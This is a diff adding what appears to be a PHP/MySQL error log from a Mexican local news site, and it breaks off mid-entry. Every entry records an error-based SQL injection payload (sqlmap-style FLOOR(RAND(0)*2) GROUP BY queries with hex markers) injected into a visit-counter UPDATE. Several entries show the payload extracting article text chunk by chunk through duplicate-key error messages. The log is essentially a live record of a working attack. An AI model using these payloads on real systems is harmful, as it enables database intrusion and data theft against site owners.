@@ -1,0 +1,887 @@
+Time : 20:15:45
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxq272qjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 5397 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(visitas AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 498,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:45
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 4646 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(videotype AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 498,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:44
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 4919 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(video AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 498,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:44
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqtitular2qjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 4045 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(ubicacion AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 498,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:43
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqlqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 4748 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(titulo AS CHAR),0x20)),55,54) FROM delbd.noticias ORDER BY id LIMIT 498,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:43
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqInauguran obras Rosario Robles y Cesar Duarte en Parraqjzjq' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 6091 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(titulo AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 498,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:43
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 6501 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo5 AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 498,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:42
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 6568 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo4 AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 498,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:42
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 3706 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo3 AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 498,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:41
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxq por supuesto México. 
+<p>
+Posteriormente el Gobernaqjzj' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 4093 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo2 AS CHAR),0x20)),1351,54) FROM delbd.noticias ORDER BY id LIMIT 498,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:41
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqon estas acciones estamos moviendo Parral, el estado yqjzjq' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 9585 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo2 AS CHAR),0x20)),1297,54) FROM delbd.noticias ORDER BY id LIMIT 498,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:40
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqto a quien aprovechó para agradecer y manifestar que cqjzj' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 7610 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo2 AS CHAR),0x20)),1243,54) FROM delbd.noticias ORDER BY id LIMIT 498,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:40
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqerno Estatal y Federal del presidente Enrique Peña Nieqjzj' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 3501 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo2 AS CHAR),0x20)),1189,54) FROM delbd.noticias ORDER BY id LIMIT 498,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:40
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxq en recuperación de la colonia con los apoyos del Gobiqjzj' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 3103 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo2 AS CHAR),0x20)),1135,54) FROM delbd.noticias ORDER BY id LIMIT 498,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:40
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxq252qjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 4129 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(visitas AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 499,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:39
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqorial y Urbano (SEDATU), en el que destacó los avancesqjzj' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 7049 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo2 AS CHAR),0x20)),1081,54) FROM delbd.noticias ORDER BY id LIMIT 498,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:39
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 8120 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(videotype AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 499,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:39
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxq titular de la Secretaría de Desarrollo Agrario Territqjzj' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 5760 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo2 AS CHAR),0x20)),1027,54) FROM delbd.noticias ORDER BY id LIMIT 498,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:39
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 9068 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(video AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 499,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:38
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqdelicias3qjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 1773 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(ubicacion AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 499,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:38
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqo Contreras dar la bienvenida a la funcionaria federalqjzjq' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 3649 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo2 AS CHAR),0x20)),973,54) FROM delbd.noticias ORDER BY id LIMIT 498,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:38
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqas qjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 2879 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(titulo AS CHAR),0x20)),55,54) FROM delbd.noticias ORDER BY id LIMIT 499,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:38
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqspondió al presidente municipal ingeniero Miguel Juradqjzj' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 2103 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo2 AS CHAR),0x20)),919,54) FROM delbd.noticias ORDER BY id LIMIT 498,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:38
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxq241qjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 2079 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(visitas AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 299,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:37
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqDos jóvenes mujeres participaran en las bodas colectivqjzj' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 4971 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(titulo AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 499,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:37
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqldas solares en la explanada de la misma. 
+<p>
+Correqjzjq' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 8180 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo2 AS CHAR),0x20)),865,54) FROM delbd.noticias ORDER BY id LIMIT 498,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:37
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 7482 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(videotype AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 299,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:37
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqerior de la cancha Deportiva y del nuevo sistema de ceqjzjq' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 5289 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo2 AS CHAR),0x20)),811,54) FROM delbd.noticias ORDER BY id LIMIT 498,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:37
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 3995 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo5 AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 499,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:37
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 4067 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(video AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 299,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:37
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 2217 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo4 AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 499,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:37
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqla develación de la placa alusiva a la iluminación intqjz' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 2443 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo2 AS CHAR),0x20)),757,54) FROM delbd.noticias ORDER BY id LIMIT 498,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:36
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqnacional1qjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 9469 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(ubicacion AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 299,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:36
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxq, en el acto jurídico realizado el pasado 18 de enero qjzj' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 9656 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo3 AS CHAR),0x20)),163,54) FROM delbd.noticias ORDER BY id LIMIT 499,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:36
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqn en este sector. 
+<p>
+Posteriormente procedieron a qjzjq' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 7687 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo2 AS CHAR),0x20)),703,54) FROM delbd.noticias ORDER BY id LIMIT 498,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:36
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxquertoqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 4619 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(titulo AS CHAR),0x20)),55,54) FROM delbd.noticias ORDER BY id LIMIT 299,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:36
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqersonas del mismo sexo puedan realizarlo. 
+<p>
+Ellasqjzjq' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 5660 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo3 AS CHAR),0x20)),109,54) FROM delbd.noticias ORDER BY id LIMIT 499,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:36
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqas que se pueden observar en beneficio de quienes viveqjzjq' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 8235 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo2 AS CHAR),0x20)),649,54) FROM delbd.noticias ORDER BY id LIMIT 498,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:36
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqTamaulipas: nuevo ataque a militares deja un agresor mqjzjq' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 9141 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(titulo AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 299,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:35
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqe la flexibilización de la ley para permitir que dos pqjzj' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 7405 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo3 AS CHAR),0x20)),55,54) FROM delbd.noticias ORDER BY id LIMIT 499,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:35
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxq últimos años ha tenido la colonia, así como las mejorqj' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 5806 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo2 AS CHAR),0x20)),595,54) FROM delbd.noticias ORDER BY id LIMIT 498,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:35
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 3238 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo5 AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 299,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:35
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqs inquietudes, además de agradecer el apoyo que en losqjzj' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 8275 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo2 AS CHAR),0x20)),541,54) FROM delbd.noticias ORDER BY id LIMIT 498,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:35
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqEste lunes, Joselyn y Angélica contrajeron nupcias antqjzj' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 4563 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo3 AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 499,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:35
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 2369 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo4 AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 299,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:34
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqLuego de permanecer en unión libre durante un año, en qjz' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 3770 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo2 AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 499,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:34
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqorto con los vecinos del lugar quienes manifestaron suqjzjq' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 8982 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo2 AS CHAR),0x20)),487,54) FROM delbd.noticias ORDER BY id LIMIT 498,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:34
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 9607 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo3 AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 299,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:34
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqJiménez.qjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 8436 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo AS CHAR),0x20)),109,54) FROM delbd.noticias ORDER BY id LIMIT 499,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:34
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqtario estatal tuvieron la oportunidad de platicar en cqjzjq' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 9215 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo2 AS CHAR),0x20)),433,54) FROM delbd.noticias ORDER BY id LIMIT 498,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:34
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqientos terrestres.
+<p>
+Al repeler la agresión en defqjzj' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 2377 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo2 AS CHAR),0x20)),271,54) FROM delbd.noticias ORDER BY id LIMIT 299,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:34
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqas organizadas por el Registro Civil del municipio de qjzjq' for key 'group_key'
